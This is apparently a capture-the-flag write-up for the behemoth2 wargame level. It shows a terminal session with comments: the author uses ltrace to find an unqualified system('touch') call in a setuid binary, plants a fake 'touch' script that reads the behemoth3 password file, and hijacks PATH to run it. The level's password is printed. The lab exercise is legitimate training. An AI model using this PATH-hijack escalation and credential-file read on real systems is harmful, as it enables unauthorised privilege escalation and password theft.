behemoth2@behemoth:/tmp/lvl3$ ltrace /behemoth/behemoth2
__libc_start_main(0x804856b, 1, 0xffffd774, 0x8048660 <unfinished ...>
getpid()                                                                                                              = 6829
sprintf("touch 6829", "touch %d", 6829)                                                                               = 10
__lxstat(3, "6829", 0xffffd640)                                                                                       = -1
unlink("6829")                                                                                                        = -1
geteuid()                                                                                                             = 13002
geteuid()                                                                                                             = 13002
setreuid(13002, 13002)                                                                                                = 0
system("touch 6829" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                = 0
sleep(2000^Z
[1]+  Stopped                 ltrace /behemoth/behemoth2
behemoth2@behemoth:/tmp/lvl3$ ps -a | grep behemoth2
 6829 pts/1    00:00:00 behemoth2
//Running ltrace reveals that behemoth2 is executing a system call to touch $PID
//Running ps -a | grep behemoth2 reveals that touch is calling the behemoth2 script without an absoulte path

//cd into tmp and  create dir. Add the command to output the contents of behemoth3's flag.
behemoth2@behemoth:/tmp/lvl3$ echo "cat /etc/behemoth_pass/behemoth3" > /tmp/lvl3/touch
behemoth2@behemoth:/tmp/lvl3$ chmod 777 touch 
behemoth2@behemoth:/tmp/lvl3$ /behemoth/behemoth2
touch: cannot touch '6792': Permission denied

//the path to the current dir needs to be added to the path
behemoth2@behemoth:/tmp/lvl3$ export PATH=/tmp/lvl3/:$PATH
behemoth2@behemoth:/tmp/lvl3$ /behemoth/behemoth2
nieteidiel

